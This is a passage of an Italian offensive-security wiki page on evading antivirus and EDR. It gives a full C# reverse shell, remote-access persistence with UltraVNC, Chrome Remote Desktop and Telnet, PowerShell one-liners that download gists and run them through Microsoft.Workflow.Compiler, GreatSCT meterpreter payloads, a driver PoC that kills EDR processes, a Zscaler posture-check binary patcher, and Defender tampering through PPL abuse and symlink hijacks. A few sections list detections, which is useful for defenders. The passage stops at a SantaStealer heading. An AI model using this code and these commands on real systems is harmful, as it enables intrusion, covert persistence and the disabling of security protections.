Puoi trovare più informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Il caricamento di binari C# in memoria è noto da tempo ed è ancora un ottimo metodo per eseguire i propri strumenti di post-exploitation senza essere individuati dall'AV.

Poiché il payload viene caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci solo di patchare AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) già forniscono la possibilità di eseguire assembly C# direttamente in memoria, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Consiste nello **spawnare un nuovo processo sacrificial**, iniettare il tuo codice post-exploitation malevolo in quel nuovo processo, eseguire il codice malevolo e, quando finito, terminare il nuovo processo. Questo ha sia vantaggi che svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **al di fuori** del nostro processo Beacon implant. Questo significa che se qualcosa nella nostra azione di post-exploitation va storto o viene rilevato, c'è una **probabilità molto maggiore** che il nostro **implant sopravviva.** Lo svantaggio è che hai una **maggiore probabilità** di essere scoperto da **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste nell'iniettare il codice post-exploitation malevolo **nel proprio processo**. In questo modo si evita di creare un nuovo processo che possa venire scansionato dall'AV, ma lo svantaggio è che se qualcosa va storto nell'esecuzione del payload, c'è una **probabilità molto maggiore** di **perdere il beacon** poiché potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi leggere di più sul caricamento di C# Assembly, dai un'occhiata a questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e al loro InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare C# Assemblies **da PowerShell**, guarda [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e il [video di S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo usando altri linguaggi dando alla macchina compromessa accesso **all'ambiente dell'interprete installato sulla Attacker Controlled SMB share**.

Permettendo l'accesso ai binari dell'interprete e all'ambiente sulla condivisione SMB controllata dall'attaccante, puoi **eseguire codice arbitrario in questi linguaggi all'interno della memoria** della macchina compromessa.

Il repo indica: Defender continua a scansionare gli script ma utilizzando Go, Java, PHP ecc. abbiamo **più flessibilità per bypassare firme statiche**. Test con script di reverse shell non offuscati in questi linguaggi hanno dato risultati positivi.

## TokenStomping

Token stomping è una tecnica che permette a un attaccante di **manipolare il token di accesso o un prodotto di sicurezza come un EDR o AV**, permettendo loro di ridurne i privilegi in modo che il processo non muoia ma non abbia i permessi per controllare attività malevole.

Per prevenire questo Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Come descritto in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile semplicemente distribuire Chrome Remote Desktop sul PC della vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:
1. Scarica da https://remotedesktop.google.com/, clicca su "Set up via SSH", e poi clicca sul file MSI per Windows per scaricare l'MSI.
2. Esegui l'installer silenziosamente sulla macchina vittima (richiede admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e clicca next. Il wizard ti chiederà di autorizzare; clicca il pulsante Authorize per continuare.
4. Esegui il parametro fornito con qualche aggiustamento: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota il parametro pin che permette di impostare il pin senza usare l'interfaccia GUI).


## Advanced Evasion

Evasion è un argomento molto complesso, a volte bisogna tenere conto di molte diverse sorgenti di telemetry in un singolo sistema, quindi è praticamente impossibile restare completamente non rilevati in ambienti maturi.

Ogni ambiente contro cui ti confronti avrà i suoi punti di forza e di debolezza.

Ti consiglio caldamente di guardare questo talk di [@ATTL4S](https://twitter.com/DaniLJ94), per ottenere una base sulle tecniche di Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questo è anche un altro ottimo talk di [@mariuszbit](https://twitter.com/mariuszbit) sull'Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) che **rimuoverà parti del binario** fino a quando **non scopre quale parte Defender** interpreta come malevola e te la mostra.\
Un altro strumento che fa la **stessa cosa è** [**avred**](https://github.com/dobin/avred) con un servizio web pubblico disponibile su [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Fino a Windows10, tutte le versioni di Windows includevano un **Telnet server** che potevi installare (come amministratore) facendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fai in modo che si **avvii** all'avvio del sistema e **eseguilo** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambia telnet port** (stealth) e disabilita firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (prendi i download binari, non l'installer)

**SUL HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Poi, sposta il binario _**winvnc.exe**_ e il file **appena** creato _**UltraVNC.ini**_ all'interno della **vittima**

#### **Connessione inversa**

L'**attacker** dovrebbe **eseguire sul** suo **host** il binario `vncviewer.exe -listen 5900` così sarà **preparato** a intercettare una reverse **VNC connection**. Poi, all'interno della **vittima**: Avvia il demone winvnc `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere lo stealth non devi fare alcune cose

- Non avviare `winvnc` se è già in esecuzione o innescherai un [popup](https://i.imgur.com/1SROTTl.png). controlla se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory o si aprirà [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per l'aiuto o innescherai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
All'interno di GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **avvia il lister** con `msfconsole -r file.rc` ed **esegui** il **xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**L'attuale defender terminerà il processo molto rapidamente.**

### Compilare la nostra reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primo C# Revershell

Compilarlo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando il compilatore
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e esecuzione automatici:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di obfuscatori C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Esempio: usare Python per creare injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 ha sfruttato una piccola utility da console nota come **Antivirus Terminator** per disabilitare le protezioni endpoint prima di rilasciare il ransomware. Lo strumento include il proprio driver vulnerabile ma *signed* e lo sfrutta per emettere operazioni privilegiate in kernel che anche i servizi AV Protected-Process-Light (PPL) non possono bloccare.

Punti chiave
1. **Driver firmato**: Il file consegnato su disco è `ServiceMouse.sys`, ma il binario è il legittimo driver firmato `AToolsKrnl64.sys` dell’“System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver possiede una firma Microsoft valida, viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Installazione del servizio**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La prima riga registra il driver come servizio **kernel** e la seconda lo avvia in modo che `\\.\ServiceMouse` diventi accessibile dallo spazio utente.
3. **IOCTLs esposti dal driver**
| IOCTL code | Capacità                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminare un processo arbitrario per PID (usato per terminare i servizi Defender/EDR) |
| `0x990000D0` | Eliminare un file arbitrario su disco |
| `0x990001D0` | Scaricare il driver e rimuovere il servizio |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Perché funziona**: BYOVD bypassa completamente le protezioni in user-mode; codice che viene eseguito in kernel può aprire processi *protected*, terminarli o manomettere oggetti kernel indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Rilevamento / Mitigazione
•  Abilitare la block list dei driver vulnerabili di Microsoft (`HVCI`, `Smart App Control`) in modo che Windows rifiuti di caricare `AToolsKrnl64.sys`.  
•  Monitorare la creazione di nuovi servizi *kernel* e generare alert quando un driver viene caricato da una directory scrivibile da tutti o non è presente nella allow-list.  
•  Monitorare handle in user-mode verso oggetti device personalizzati seguiti da sospette chiamate DeviceIoControl.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Il Client Connector di Zscaler applica le regole di device-posture localmente e si affida a Windows RPC per comunicare i risultati ad altri componenti. Due deboli scelte di design rendono possibile un bypass completo:

1. La valutazione della posture avviene **interamente client-side** (viene inviato al server un valore booleano).  
2. Gli endpoint RPC interni verificano solo che l'eseguibile che si connette sia **firmato da Zscaler** (tramite `WinVerifyTrust`).

Patchando quattro binari firmati su disco, entrambi i meccanismi possono essere neutralizzati:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Ritorna sempre `1`, quindi ogni controllo risulta conforme |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | NOP-izzato ⇒ qualsiasi processo (anche non firmato) può collegarsi alle pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita da `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Controlli di integrità sul tunnel | Saltati |

Estratto minimale del patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Dopo aver sostituito i file originali e riavviato lo stack di servizi:

* **Tutti** i controlli di postura risultano **verde/conforme**.
* File binari non firmati o modificati possono aprire gli endpoint RPC su named-pipe (es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso illimitato alla rete interna definita dalle policy Zscaler.

Questo caso di studio dimostra come decisioni di trust interamente lato client e semplici verifiche di firma possano essere sconfitte con poche patch di byte.

## Sfruttare Protected Process Light (PPL) per manomettere AV/EDR con LOLBINs

Protected Process Light (PPL) applica una gerarchia firma/livello in cui solo processi protetti di livello uguale o superiore possono manomettersi a vicenda. Dal punto di vista offensivo, se puoi avviare legittimamente un binario abilitato PPL e controllarne gli argomenti, puoi convertire funzionalità innocue (es. logging) in una primitive di scrittura vincolata, supportata da PPL, verso directory protette usate da AV/EDR.

What makes a process run as PPL
- L'EXE target (e qualsiasi DLL caricata) devono essere firmati con un EKU abilitato per PPL.
- Il processo deve essere creato con CreateProcess usando i flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve essere richiesto un livello di protezione compatibile che corrisponda alla firma del binario (es. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` per signer anti-malware, `PROTECTION_LEVEL_WINDOWS` per signer Windows). Livelli sbagliati falliranno alla creazione.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Helper open-source: CreateProcessAsPPL (seleziona il livello di protezione e inoltra gli argomenti all'EXE target):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Pattern d'uso:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitiva: ClipUp.exe
- Il binario di sistema firmato `C:\Windows\System32\ClipUp.exe` si auto-lancia e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Quando avviato come processo PPL, la scrittura del file avviene con supporto PPL.
- ClipUp non può analizzare percorsi contenenti spazi; usa i percorsi 8.3 short paths per puntare a posizioni normalmente protette.

8.3 short path helpers
- Elenca i nomi corti: `dir /x` in ogni directory padre.
- Deriva il percorso corto in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Avvia la LOLBIN capace di PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un lanciatore (es., CreateProcessAsPPL).
2) Passa l'argomento log-path di ClipUp per forzare la creazione di un file in una directory AV protetta (es., Defender Platform). Usa i nomi 8.3 se necessario.
3) Se il binario target è normalmente aperto/bloccato dall'AV durante l'esecuzione (es., MsMpEng.exe), pianifica la scrittura all'avvio prima che l'AV si avvii installando un servizio auto-start che venga eseguito in modo affidabile prima. Valida l'ordine di avvio con Process Monitor (boot logging).
4) Al riavvio la scrittura con supporto PPL avviene prima che l'AV blocchi i suoi binari, corrompendo il file target e impedendone l'avvio.

Example invocation (percorsi oscurati/accorciati per sicurezza):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Note e vincoli
- Non puoi controllare i contenuti che ClipUp scrive oltre alla posizione; la primitiva è adatta alla corruzione piuttosto che all'iniezione precisa di contenuto.
- Richiede amministratore locale/SYSTEM per installare/avviare un servizio e una finestra di reboot.
- Il timing è critico: il target non deve essere aperto; l'esecuzione all'avvio evita blocchi sui file.

Rilevamenti
- Creazione di processi di `ClipUp.exe` con argomenti insoliti, specialmente parented da launcher non standard, durante l'avvio.
- Nuovi servizi configurati per auto-start di binari sospetti e che partono sistematicamente prima di Defender/AV. Investigare la creazione/modifica del servizio antecedente ai fallimenti di avvio di Defender.
- Monitoraggio dell'integrità dei file sui binari di Defender/delle directory Platform; creazioni/modifiche di file inattese da processi con flag protected-process.
- ETW/EDR telemetry: cercare processi creati con `CREATE_PROTECTED_PROCESS` e uso anomalo di livelli PPL da parte di binari non-AV.

Mitigazioni
- WDAC/Code Integrity: limitare quali binari firmati possono essere eseguiti come PPL e sotto quali parent; bloccare l'invocazione di ClipUp al di fuori di contesti legittimi.
- Igiene dei servizi: limitare la creazione/modifica di servizi auto-start e monitorare manipolazioni dell'ordine di avvio.
- Assicurarsi che Defender tamper protection e early-launch protections siano abilitate; investigare errori di avvio che indicano corruzione di binari.
- Considerare la disabilitazione della generazione di nomi 8.3 sui volumi che ospitano tooling di sicurezza se compatibile con il vostro ambiente (testare approfonditamente).

Riferimenti per PPL e tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manomissione di Microsoft Defender tramite Platform Version Folder Symlink Hijack

Windows Defender sceglie la piattaforma da cui viene eseguito enumerando le sottocartelle sotto:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sottocartella con la maggiore stringa di versione lessicografica (e.g., `4.18.25070.5-0`), poi avvia i processi di servizio di Defender da lì (aggiornando di conseguenza i percorsi del servizio/registro). Questa selezione si fida delle voci di directory incluse directory reparse points (symlinks). Un amministratore può sfruttare questo per reindirizzare Defender verso un percorso scrivibile da un attacker e ottenere DLL sideloading o la disruption del servizio.

Precondizioni
- Amministratore locale (necessario per creare directory/symlinks sotto la cartella Platform)
- Capacità di reboot o di innescare la re-selezione della platform di Defender (restart del servizio all'avvio)
- Solo strumenti integrati richiesti (mklink)

Perché funziona
Defender blocca le scritture nelle proprie cartelle, ma la sua selezione della platform si fida delle voci di directory e sceglie la versione lessicograficamente più alta senza verificare che il target risolva a un percorso protetto/affidabile.

Passo-passo (esempio)
1) Preparare un clone scrivibile della cartella platform corrente, es. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink di directory di versione superiore dentro Platform che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verificare che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Dovresti osservare il nuovo percorso di processo sotto `C:\TMP\AV\` e la service configuration/registry che riflette quella posizione.

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs che Defender carica dalla sua application directory per eseguire codice nei processi di Defender. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Rimuovere il version-symlink in modo che al successivo avvio il percorso configurato non venga risolto e Defender non riesca ad avviarsi:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Nota che questa tecnica non fornisce escalation dei privilegi di per sé; richiede diritti di amministratore.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

I red team possono spostare l'evasione a runtime fuori dall'implant C2 e nel modulo target stesso hookando la sua Import Address Table (IAT) e instradando API selezionate attraverso codice position‑independent controllato dall'attaccante (PIC). Questo generalizza l'evasione oltre la piccola superficie di API esposta da molti kit (es., CreateProcessA) e estende le stesse protezioni a BOF e DLL post‑exploitation.

Approccio ad alto livello
- Posizionare un blob PIC accanto al modulo target usando un reflective loader (prepended o companion). Il PIC deve essere autosufficiente e position‑independent.
- Mentre la DLL host viene caricata, scorrere il suo IMAGE_IMPORT_DESCRIPTOR e modificare le voci IAT per le importazioni mirate (es., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) in modo che puntino a sottili wrapper PIC.
- Ogni wrapper PIC esegue evasione prima di tail‑calling sull'indirizzo API reale. Le evasioni tipiche includono:
  - Maschera/ri-maschera della memoria attorno alla chiamata (es., encrypt beacon regions, RWX→RX, cambiare nomi/permessi delle pagine) e ripristino dopo la chiamata.
  - Call‑stack spoofing: costruire uno stack benigno e transizionare nell'API target in modo che l'analisi dello stack di chiamate risolva nei frame attesi.
- Per compatibilità, esportare un'interfaccia così che uno script Aggressor (o equivalente) possa registrare quali API hookare per Beacon, BOFs e DLL post‑ex.

Why IAT hooking here
- Funziona per qualsiasi codice che usa l'import hookato, senza modificare il codice dello strumento o fare affidamento su Beacon per proxying di API specifiche.
- Copre le DLL post‑ex: hookando LoadLibrary* è possibile intercettare i caricamenti di moduli (es., System.Management.Automation.dll, clr.dll) e applicare la stessa mascheratura/evasione dello stack alle loro chiamate API.
- Ripristina l'uso affidabile di comandi post‑ex che generano processi contro rilevamenti basati sul call‑stack avvolgendo CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Note
- Applica la patch dopo relocations/ASLR e prima del primo uso dell'import. Reflective loaders come TitanLdr/AceLdr dimostrano hooking durante DllMain del modulo caricato.
- Mantieni i wrapper piccoli e PIC‑safe; risolvi la vera API tramite il valore IAT originale che hai catturato prima della patch o tramite LdrGetProcedureAddress.
- Usa transizioni RW → RX per PIC ed evita di lasciare pagine writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stubs costruiscono una catena di chiamate falsa (indirizzi di ritorno in moduli benigni) e poi pivotano nella vera API.
- Questo vanifica le rilevazioni che si aspettano stack canonici da Beacon/BOFs verso API sensibili.
- Abbina con tecniche di stack cutting/stack stitching per atterrare all'interno dei frame attesi prima del prologo dell'API.

Operational integration
- Preponi il reflective loader alle DLL post‑ex in modo che il PIC e gli hook si inizializzino automaticamente quando la DLL viene caricata.
- Usa uno script Aggressor per registrare le API target così che Beacon e BOFs beneficino in modo trasparente dello stesso percorso di evasione senza modifiche al codice.

Detection/DFIR considerations
- IAT integrity: voci che risolvono in indirizzi non‑image (heap/anon); verifica periodica dei puntatori di import.
- Stack anomalies: indirizzi di ritorno che non appartengono a immagini caricate; transizioni brusche a PIC non‑image; ascendenza RtlUserThreadStart incoerente.
- Loader telemetry: scritture in‑process sull'IAT, attività precoce in DllMain che modifica gli import thunks, regioni RX inaspettate create al caricamento.
- Image‑load evasion: se si effettua hooking di LoadLibrary*, monitora caricamenti sospetti di automation/clr assemblies correlati con eventi di memory masking.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustra come gli info‑stealer moderni fondono AV bypass, anti‑analysis e credential access in un singolo workflow.

### Keyboard layout gating & sandbox delay

